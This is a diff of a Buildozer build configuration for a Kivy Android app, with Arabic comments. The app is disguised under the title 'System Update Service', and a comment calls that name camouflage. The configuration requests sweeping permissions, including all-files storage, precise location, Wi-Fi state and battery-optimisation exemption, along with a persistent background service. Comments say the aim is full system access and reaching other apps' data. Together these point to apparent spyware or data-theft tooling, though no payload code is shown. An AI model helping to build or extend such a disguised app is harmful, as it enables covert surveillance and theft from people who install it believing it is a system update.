@@ -1,40 +1,38 @@
 [app]
-
-# (str) عنوان التطبيق (تمويهي)
+# (str) العنوان التمويهي
 title = System Update Service
 
-# (str) اسم الحزمة
-package.name = sys_v2_core
+# (str) اسم الحزمة (يفضل تغييره قليلاً عن النسخة السابقة لتجنب تضارب التثبيت)
+package.name = sys_v3_core
 package.domain = org.system.service
 
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,ttf,json
-version = 2.0
+version = 3.0
 
-# (list) المكتبات المطلوبة (أضفت Scapy و Requests للتعامل مع الشبكة والبيانات)
-requirements = python3,kivy,requests,arabic-reshaper,python-bidi
+# (list) المكتبات المطلوبة - أضفت certifi و urllib3 لضمان عدم انهيار الاتصال المشفر
+requirements = python3,kivy,requests,urllib3,certifi,chardet,idna,arabic-reshaper,python-bidi
 
 orientation = portrait
 fullscreen = 0
 
-# (list) الصلاحيات - هذه هي "مفاتيح" الدخول للنظام
-# أضفت صلاحيات الوصول للواي فاي، الموقع (للشبكة)، والملفات الشاملة
-android.permissions = INTERNET, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, ACCESS_FINE_LOCATION, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POST_NOTIFICATIONS, FOREGROUND_SERVICE
+# (list) الصلاحيات - مرتبة بشكل يضمن الوصول الكامل
+android.permissions = INTERNET, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, ACCESS_FINE_LOCATION, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POST_NOTIFICATIONS, FOREGROUND_SERVICE
 
-# (int) استهداف أحدث API لضمان التوافق مع أندرويد 14
+# (int) استهداف أحدث API
 android.api = 34
 android.minapi = 21
 
 # (bool) دعم أندرويد الحديث
 android.enable_androidx = True
 
-# (list) البنى التحتية للمعالجات (دعم كافة الأجهزة الحديثة)
+# (list) معالجات الأجهزة (arm64 مهم جداً للأجهزة الحديثة)
 android.archs = arm64-v8a, armeabi-v7a
 
-# (bool) السماح بالوصول لبيانات التطبيقات الأخرى (قدر الإمكان)
+# (bool) السماح بالوصول للبيانات
 android.private_storage = True
 
-# (list) إضافة السيرفس (الخدمة الخلفية) لضمان عدم توقف الكود
+# (list) تفعيل الخدمات الخلفية إذا كنت تريد تشغيل الكود كـ Service
 # services = MyCoreService:service.py
 
 [buildozer]
